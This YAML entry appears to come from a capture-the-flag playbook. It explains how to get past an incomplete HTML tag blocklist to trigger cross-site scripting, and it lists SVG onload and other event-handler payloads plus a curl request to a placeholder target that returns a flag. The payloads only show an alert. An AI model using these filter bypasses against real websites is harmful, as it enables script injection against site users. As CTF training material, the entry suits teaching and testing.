name: xss_svg_tag_blacklist_bypass
category: web
tags: [xss, blacklist_bypass, svg, event_handler]
indicators:
  - "Tag blacklist filtering (script, img, input, a, div, iframe)"
  - "Character filtering (/ removed)"
  - "User input reflected in HTML"
  - "Incomplete tag blacklist"

tricks:
  - name: "Step 1: Identify filtered tags"
    when: "Found XSS input point"
    how: "Analyze filter rules"
    payload: |
      # Filtered tags: script, img, input, a, div, iframe
      # Filtered chars: /
      # SVG tag is NOT filtered!

  - name: "Step 2: Use SVG tag bypass"
    when: "SVG not in blacklist"
    how: "Use svg onload event"
    payload: |
      <svg onload=alert('XSS')>
      # SVG tag with onload event triggers JavaScript

  - name: "Step 3: Trigger XSS and get flag"
    when: "Execute attack"
    how: "Send payload via name parameter"
    payload: |
      curl "http://TARGET/page?name=<svg%20onload=alert('XSS')>"
      # Response: Congratulations! Here is the flag: flag{...}

  - name: "Alternative: Other unfiltered tags"
    when: "Need variations"
    how: "Try other event-capable tags"
    payload: |
      <body onload=alert('XSS')>
      <svg onmouseover=alert('XSS')>
      <details open ontoggle=alert('XSS')>
      <marquee onstart=alert('XSS')>
      <video><source onerror=alert('XSS')>
